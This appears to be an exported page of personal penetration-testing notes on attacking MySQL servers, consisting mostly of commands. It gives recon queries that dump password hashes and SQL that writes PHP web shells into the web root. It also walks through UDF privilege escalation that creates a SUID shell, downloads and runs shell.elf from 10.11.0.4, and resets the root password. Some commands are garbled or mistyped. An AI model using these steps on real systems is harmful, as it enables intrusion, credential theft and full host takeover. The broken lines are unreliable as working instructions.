<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>mysql</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>mysql</h1><br/><p><strong><h3>Connect :</h3></strong><ul><li>mysql -u root -proot -h $target</li><li>root : </li></ul></p><p></p><p></p><p><strong><h3>Recon</h3></strong></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">select</span> <span style="color:#ffdd00;font-weight:400">version()</span><span style="color:#ff9d00;font-weight:700">;</span><br /><span style="color:#ff9d00;font-weight:700">select</span> <span style="color:#ffdd00;font-weight:400">system_user()</span><span style="color:#ff9d00;font-weight:700">;</span><br />show databases<span style="color:#ff9d00;font-weight:700">;</span><br />SELECT user, authentication_string FROM mysql.user WHERE user = <span style="color:#3ad900;font-weight:400">&#39;offsec&#39;</span><span style="color:#ff9d00;font-weight:700">;</span><br />SHOW GRANTS<span style="color:#ff9d00;font-weight:700">;</span>  <span style="color:#0088ff;font-weight:400">#privs</span><br />Show variables<span style="color:#ff9d00;font-weight:700">;</span>   <span style="color:#0088ff;font-weight:400">#host enum</span><br /><span style="color:#ff9d00;font-weight:700">select</span> @@hostname,@@tmpdir,@@version,@@plugin_dir,@@version_compile_machine  <span style="color:#0088ff;font-weight:400">##variables </span><br />• searchploit version<br />• UDF elavtion privileges<br />   ◇ user defined functions</pre></div><ul><li></li></ul></p><p></p><p><h3></h3></p><p><h3> </h3><strong><h3>Update Database:</h3></strong><ul><li>update users set adm=&quot;yes&quot; where username=&quot;tracking1&quot;;</li><li> <h3>update &lt;table&gt; set ??? </h3></li></ul></p><p></p><p></p><p></p><p></p><p><strong><h3>Easy Vulnerabilities / exploits </h3></strong></p><p> <ul><li><em><h3> --secure-file-priv disabled</h3></em><ul><li> <a href="http://"> https://blog.rapid7.com/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql/</a></li><li><h3> https://stackoverflow.com/questions/32737478/how-should-i-tackle-secure-file-priv-in-mysql</h3></li><li><h3>Exploit :</h3><ul><li><h3>  LOAD DATA INFILE &quot;text.txt&quot; INTO table mytable;</h3></li><li><h3>- // --secure-file-priv option which basically limits from which directories you can load files using LOAD DATA INFILE.</h3></li><li><h3>  select load-file(&quot;/etc/passwd&quot;)</h3></li><li><h3> select 1,2,&quot;&lt;?php echo shell_exec($_GET[&#39;c&#39;]);?&gt;&quot;,4 into OUTFILE &#39;/var/www/html/static&#39;</h3></li></ul></li></ul></li></ul><h3></h3></p><p><h3> ▪ </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3></p><p><h3></h3></p><p><h3> </h3><strong><h3> udf exploit (mysql with no passwds )</h3></strong><ul><li>like plugin  </li><li>several one exist </li><li>  /usr/share/exploitdb/exploits/linux/local/46249.py.<ul><li></li></ul></li></ul><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">select</span> @@plugin_dir<br /><span style="color:#ff9d00;font-weight:700">select</span> binary 0xshellcode into dumpfile @@plugin_dir<span style="color:#ff9d00;font-weight:700">;</span><br />create function sys_exec returns int soname udf_filename<span style="color:#ff9d00;font-weight:700">;</span><br /><span style="color:#ff9d00;font-weight:700">select</span> * from mysql.func where name=<span style="color:#3ad900;font-weight:400">&#39;sys_exec&#39;</span><span style="color:#ff9d00;font-weight:700">;</span><br /><span style="color:#ff9d00;font-weight:700">select</span> sys_exec<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&#39;cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh&#39;</span><span style="color:#ff9d00;font-weight:700">)</span><br /><span style="color:#ff9d00;font-weight:700">select</span> sys_exec<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&#39;wget http://10.11.0.4/shell.elf&#39;</span><span style="color:#ff9d00;font-weight:700">);</span><br /><span style="color:#ff9d00;font-weight:700">select</span> sys_exec<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&#39;chmod +x ./shell.elf&#39;</span><span style="color:#ff9d00;font-weight:700">);</span><br /><span style="color:#ff9d00;font-weight:700">select</span> sys_exec<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&#39;./shell.elf&#39;</span><span style="color:#ff9d00;font-weight:700">);</span></pre></div><ul><li> <h3> https://www.exploit-db.com/exploits/1518</h3><ul><li></li></ul></li></ul><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">gcc</span> -g -c raptor_udf2.c -fPIC<br /><span style="color:#ff9d00;font-weight:700">gcc</span> -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc<br /> mysql -u root -proot -h <span style="color:#7f0044;font-weight:400">$target</span><br />create table foo<span style="color:#ff9d00;font-weight:700">(</span>line blob<span style="color:#ff9d00;font-weight:700">);</span><br />insert into foo values<span style="color:#ff9d00;font-weight:700">(</span>load_file<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&#39;/home/user/tools/mysql-udf/raptor_udf2.so&#39;</span><span style="color:#ff9d00;font-weight:700">));</span><br /><span style="color:#ff9d00;font-weight:700">select</span>  from foo into dumpfile <span style="color:#3ad900;font-weight:400">&#39;/usr/lib/mysql/plugin/raptor_udf2.so&#39;</span><span style="color:#ff9d00;font-weight:700">;</span><br />create function do_system returns integer soname <span style="color:#3ad900;font-weight:400">&#39;raptor_udf2.so&#39;</span><span style="color:#ff9d00;font-weight:700">;</span><br /><span style="color:#ff9d00;font-weight:700">//</span> Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:</pre></div><ul><li>REquirements<ul><li>ELECT, INSERT, UPDATE, and DELETE , and dumpfile</li></ul></li></ul></p><p> </p><p><h3></h3></p><p><h3> </h3></p><p><strong><h3>The basic methodology for exploiting MySQL </h3></strong><h3></h3></p><p><h3> </h3><ol><li><h3> Access the remote database using administrator credentials</h3></li><li><h3>Create a new table in the main database</h3></li><li><h3>Inject PHP code to gain command execution</h3><ol><li><h3>Example code: &lt;?php $cmd=$_GET[&quot;cmd&quot;];system($cmd);?&gt;</h3></li></ol></li><li><h3>Drop table contents onto a file the user can access</h3><ol><li><h3> select &#39;&lt;?php $cmd=$_GET[&quot;cmd&quot;];system($cmd);?&gt;&#39; INTO OUTFILE &#39;/var/www/html/shell.php&#39;;</h3></li></ol></li><li><h3> Execute and obtain RCE on the host.</h3><ol><li><h3> curl 127.0.0.1:8080/shell.php?cmd=whoami</h3></li></ol></li></ol><h3></h3></p><p><h3>  </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3></h3><h2>Public </h2><h3>Vulns</h3><ul><li>auth bypass<ul><li><a href="https://www.exploit-db.com/exploits/19092">https://www.exploit-db.com/exploits/19092</a></li></ul></li><li></li></ul></p><p> </p><p><h3> </h3><h3></h3></p><p><h3></h3><strong><h2>Mysql UDF exploit</h2></strong></p><p><div class="codebox"><pre>MySQL 4.x/5.0 <span style="color:#333333;font-weight:400">(Linux)</span> - User-Defined Function Dynamic Library<br />searchsploit mysql udf<br /><br /><span style="color:#ff9d00;font-weight:700">gcc</span> -g -c raptor_udf2.c<br /><span style="color:#ff9d00;font-weight:700">gcc</span> -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc<br /><br />mysql -u root<br />use mysql<span style="color:#ff9d00;font-weight:700">;</span><br />create table youn<span style="color:#ff9d00;font-weight:700">(</span>line blob<span style="color:#ff9d00;font-weight:700">);</span><br />insert into youn values<span style="color:#ff9d00;font-weight:700">(</span>load_file<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&#39;/tmp/raptor_udf2.so&#39;</span><span style="color:#ff9d00;font-weight:700">));</span><br /><span style="color:#ff9d00;font-weight:700">select</span> * from youn into dumpfile <span style="color:#3ad900;font-weight:400">&#39;/usr/lib/raptor_udf2.so&#39;</span><span style="color:#ff9d00;font-weight:700">;</span><br />create function do_system returns integer soname <span style="color:#3ad900;font-weight:400">&#39;raptor_udf2.so&#39;</span><span style="color:#ff9d00;font-weight:700">;</span><br /><span style="color:#ff9d00;font-weight:700">select</span> * from mysql.func<span style="color:#ff9d00;font-weight:700">;</span><br /><span style="color:#ff9d00;font-weight:700">select</span> do_system<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&#39;echo &quot;pass123&quot; | passwd --stdin root&#39;</span><span style="color:#ff9d00;font-weight:700">);</span></pre></div> </p></div>
</body>
</html>
